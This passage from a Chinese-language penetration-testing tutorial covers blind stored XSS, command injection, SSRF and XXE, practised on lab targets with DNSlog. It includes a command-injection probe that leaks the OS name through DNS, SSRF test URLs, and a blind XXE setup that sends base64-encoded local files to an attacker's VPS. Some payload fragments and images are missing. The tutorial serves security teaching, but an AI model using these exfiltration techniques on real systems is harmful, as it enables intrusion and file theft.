登录后台查看
[
成功，这就是一个存储型xss盲打
[
### 3.3.无回显的命令执行
#### 3.3.1.介绍
我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功
#### 3.3.2.过程
发现疑似命令执行的洞，但是目标站点什么也不显示，无法确认是不是有洞
如果是win系统，简单的`ping %os%.xxxx.cete.io`即可
[
DNSlog这边得到了os的信息，那么就说明这里存在命令注入
下面是windows的常用变量：
    //变量                     类型       描述
    //%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
    //%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
    //%CD%                     本地       返回当前目录字符串。
    //%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
    //%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
    //%COMPUTERNAME%           系统       返回计算机的名称。
    //%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
    //%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
    //%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
    //%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
    //%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
    //%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
    //%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
    //%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
    //%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
    //%PATH%                   系统       指定可执行文件的搜索路径。
    //%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
    //%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
    //%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
    //%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
    //%PROCESSOR_REVISION%     系统       返回处理器的版本号。
    //%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
    //%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
    //%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
    //%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
    //%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
    //%TIME%                   系统       返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。
    //%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
    //%USERNAME%               本地       返回当前登录的用户的名称。
    //%USERPROFILE%            本地       返回当前用户的配置文件的位置。
    //%WINDIR%                 系统       返回操作系统目录的位置。
如果目标系统是linux的话，则可用shell语言
[
[
或者
[
[
### 3.4.无回显的SSRF
#### 3.4.1.介绍
这里先来介绍下这个漏洞：
SSRF (Server-Side Request Forgery，服务器端请求伪造)
是一种由攻击者构造请求，由服务端发起请求的安全漏洞，一般情况下，SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，当作跳板进行攻击。
攻击者利用了可访问Web服务器（A）的特定功能
构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。
SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。
例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF利用存在缺陷的WEB应用作为代理
攻击远程 和 本地的服务器。
介绍结束。
那么当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL，若存在回显利用方式比较多
。但是若遇到无回显的SSRF，这时就可以考虑用DNSlog来解决。
#### 3.4.2.过程
这里用的时CTFHub上面的一个SSRF靶场。[CTFHub](https://www.ctfhub.com/#/skilltree "CTFHub")
一点击进去首页就是这样,看到这样的url便下意识想到ssrf
[
这里因为是让我们从目标主机内网环境访问其本地的flag.php，那我们就构造：`/?url=http://127.0.0.1/flag.php`
然后就成功访问到了目标机本地的flag.php
[
这种是有回显的，我们很容易就判断出来这里存在SSRF漏洞。那么如果这里是无回显的呢，那么该如何判断这里可能存在SSRF呢？那么在前期渗透的时候我们这里就可以用DNSlog来初步判断服务器有对外发送请求的行为，为下一步的SSRF渗透打下基础：
`/?url=http://hfsy89.ceye.io`
[
然后看我们的dnslog平台是否有服务器的IP来判断,这里就有可能有SSRF漏洞。
[  
但是要特别注意一点：  
这样不能证明它一定能请求到内网，比如一些业务场景如人脸识别、图床、或者需要去外部加载资源等等，本身限制了访问内网ip，但是dnslog是在外网的，本身就可以访问的到。所以这里还有待继续研究。
### 3.5.无回显的XXE（Blind XXE）
#### 3.5.1.介绍
XXE漏洞全称（X ML External Entity Injection）即X ML外部实体注入漏洞，XXE漏洞发生在应用程序解析X
ML输入时，没有禁止外部实体的加载（下面会介绍），导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。
那么来介绍介绍外部实体的加载：
实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。
1.内部实体声明
``
如：
我们要引用上面两个实体,则:
    &writer;©right;                 //&writer;相当于 "Johnson666"
2.外部实体声明
``
如:
引用：
    &writer;©right;
这两种引用的方式都为：
`&实体名;`
以上为外部实体的加载。
xxe如果前端页面都会有一个回显的话，我们可以很方便的进行文件读取，那前端页面要是不进行回显了，那我们怎么判断是否存在xxe漏洞了呢？这里就涉及了blind
xxe(无回显的xxe)，其实利用dnslog就能进行判断，若dnslog有记录说明存在此漏洞。这里最关键的是证明存在后，怎么用blind
xxe进行文件读取，这就涉及到用VPS了，下面我会介绍。
#### 3.5.2.过程
这里我以pikachu靶场为例：
1.修改源码
我们将源码中的输出语句进行注释，构成Blind XXE
[
这样再进行判断是否能输出解析的X ML语句，如下页面中就看到不了hi了
[
原本没修改源码前是可以看到的
[
2.漏洞验证
在输入框中提交dnslog测试的语句
    ]>
    ξAny bugs?
[
然后去dnslog平台上查看，看到接收到了信息，说明漏洞真的存在
[
3.文件读取
这里需要一个VPS，VPS中放入一个DTD的文件，并在该文件所在目录开启一个web服务，我这里用的是python开启的
a.dtd文件内如下:
    ">
这段代码的意思是：实体int为`http://vps的ip:6666/`，实体file为`file:///c:/windows/blind.txt`（经过b
ase64编码），总体的意思就是访问vps的6666端口并携带本机的c:/windows/blind.txt的文件。
python开启web服务，监听11111端口
`python -m http.server 11111`
[
这样就可以通过本机去访问这个web服务
[
然后再用python再开启一个端口，接收读取的目标服务器的数据，这里监听的是上面文件中写的6666端口
[
payload:
    %xxe;%int;%send; ]>
[
burp suite提交数据后，可能会无响应，这时只要刷新一下浏览器所在的web服务界面就行
查看接收的数据
[
我们将这个数据进行b ase64解码后查看，就是我们主机上的文件
[
通过这样的方式，我们可以一直进行文件读取，直到读取到有用的数据，比如说公钥文件，就可能能进行远程连接ssh。